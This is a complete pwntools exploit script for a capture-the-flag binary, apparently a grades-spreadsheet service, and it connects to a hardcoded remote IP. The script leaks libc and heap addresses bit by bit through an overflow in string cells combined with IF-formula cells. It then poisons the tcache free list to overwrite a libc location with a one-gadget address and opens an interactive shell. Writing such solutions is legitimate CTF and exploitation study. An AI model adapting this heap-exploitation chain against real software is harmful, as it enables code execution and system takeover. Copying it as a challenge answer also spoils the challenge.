from pwn import *

context.arch = "amd64"
elf = context.binary = ELF("chall")
libc = ELF("libc.so.6")

if args.REMOTE:
	#p = remote("127.0.0.1", 5003)
	p = remote("65.109.185.145", 5003)
else:
	p = elf.process()

if args.GDB:
	gdb.attach(p)
	pause()

def set_cell(x, y, value):
	p.sendline(b"set-grade %d %d %s" % (x, y, value))

def display():
	p.sendline(b"show-grades")
	p.recvuntil(b"Grades:\n")
	table = []
	for i in range(8):
		table.append(p.recvline().strip().split())
	return table

def set_string(x, y, string):
	set_cell(x, y, b'"' + string + b'"')

def set_formula(x, y, cond_x, cond_y, cmp_val, out1, out2):
	set_cell(x, y, b"=IF(%d:%d > %d, %d, %d)" % (cond_x, cond_y, cmp_val, out1, out2))

# returns true iff (*(qword *)(.data + rel_addr + 8) > cmp_val)
_first_time_leaking = True
def leak_addr_one_bit(cmp_val, rel_addr):
	global _first_time_leaking
	if (not _first_time_leaking):
		set_string(0, 0, b"BBBB")
		set_formula(0, 2, 0, 0, 0x1234, 1, 2)
	_first_time_leaking = False
	set_string(0, 0, b"AAAA")
	set_formula(0, 2, 0, 0, cmp_val, 1, 2)
	set_string(0, 0, b"BBBB")
	set_string(0, 0, b"A\\\0" + b"A" * 22 + p64(0x31).replace(b"\0", b"\\\0") + p8(rel_addr))
	# pause()
	table = display()
	return (int(table[0][2]) == 1)

# leak a full qword at (.data + rel_addr + 8) with `bitcount` bits
def leak_addr(rel_addr, bitcount):
	result_addr = 0
	for bit in range(bitcount, -1, -1):
		if leak_addr_one_bit((result_addr | (1 << bit)) - 1, rel_addr):
			result_addr |= (1 << bit)
	return result_addr

stdout_addr = leak_addr(0x18, 48)
libc.address = stdout_addr - libc.sym["_IO_2_1_stdout_"]
log.success("libc base = " + hex(libc.address))
heap_base = (leak_addr(0x61, 48) << 8) & ~0xfff
log.success("heap base = " + hex(heap_base))

set_string(1, 0, b"BBBB")
set_string(1, 1, b"CCCC")
set_string(1, 2, b"DDDD")
set_string(1, 3, b"EEEE")
set_cell(1, 3, b"123")
set_cell(1, 2, b"123")
set_cell(1, 1, b"123")
write_target = libc.address + 0x21a020
set_string(1, 1, b"A\\\0" + b"A" * 22 + p64(0x21).replace(b"\0", b"\\\0") + \
		   p64(write_target ^ (heap_base >> 12)))
set_string(1, 2, b"EEEE")
set_string(1, 3, p64(libc.address + 0xebc88))
set_string(3, 3, b"A")

p.interactive()
